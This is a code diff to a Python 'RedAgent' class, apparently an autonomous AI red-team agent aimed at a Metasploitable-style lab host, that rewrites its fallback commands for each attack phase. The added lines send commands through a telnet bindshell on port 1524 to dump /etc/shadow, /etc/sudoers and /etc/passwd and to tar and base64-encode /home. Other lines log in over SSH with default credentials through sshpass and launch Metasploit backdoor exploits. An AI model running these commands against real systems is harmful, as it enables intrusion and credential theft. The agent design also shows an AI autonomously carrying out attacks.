@@ -378,9 +378,9 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                 fallback_commands = {
                     "recon": "nmap -sV -sC -p- 10.10.10.10",
                     "enumeration": "mysql -h 10.10.10.10 -u root -e 'show databases'",
-                    "exploit": "telnet 10.10.10.10 1524",
-                    "privesc": "find / -perm -u=s -type f 2>/dev/null",
-                    "exfiltrate": "cat /etc/shadow",
+                    "exploit": "{ echo 'id; whoami'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
+                    "privesc": "{ echo 'find / -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
+                    "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
                 }
                 command = fallback_commands.get(phase, "echo 'Fallback command'")
             
@@ -408,8 +408,8 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                 "recon": "nmap -sV -sC -p- 10.10.10.10",
                 "enumeration": "showmount -e 10.10.10.10",
                 "exploit": "telnet 10.10.10.10 1524",
-                "privesc": "sudo -l",
-                "exfiltrate": "cat /etc/shadow",
+                "privesc": "find / -perm -u=s -type f 2>/dev/null",
+                "exfiltrate": "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet 10.10.10.10 1524",
             }
             command = fallback_commands.get(phase, "echo 'Error fallback'")
             gpt_reason = f"Fallback command for {phase} after error"
@@ -480,22 +480,22 @@ class RedAgent(EnhancedAgentBase, MemorySyncInterface):
                                 "smtp-user-enum -M VRFY -U /tmp/users.txt -t target"
                             ],
                             "exploit": [
-                                "telnet target 1524",
+                                "{ echo 'id; whoami'; sleep 2; } | timeout 10 telnet target 1524",
                                 "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
                                 "msfconsole -q -x 'use exploit/multi/samba/usermap_script'",
-                                "ssh msfadmin@target"
+                                "sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@target 'id; whoami'"
                             ],
                             "privesc": [
-                                "sudo -l",
-                                "find / -perm -u=s -type f 2>/dev/null",
-                                "uname -a",
-                                "cat /etc/crontab"
+                                "{ echo 'find / -perm -u=s -type f 2>/dev/null | head -20'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'uname -a'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'cat /etc/crontab'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'id; cat /etc/sudoers'; sleep 2; } | timeout 10 telnet target 1524"
                             ],
                             "exfiltrate": [
-                                "cat /etc/shadow",
-                                "tar -czf /tmp/data.tar.gz /home/",
-                                "python3 -m http.server 8888",
-                                "base64 /etc/passwd"
+                                "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'tar czf - /home/ 2>/dev/null | base64'; sleep 3; } | timeout 15 telnet target 1524",
+                                "{ echo 'base64 /etc/passwd'; sleep 2; } | timeout 10 telnet target 1524",
+                                "{ echo 'cat /etc/shadow | base64'; sleep 2; } | timeout 10 telnet target 1524"
                             ]
                         }
                         
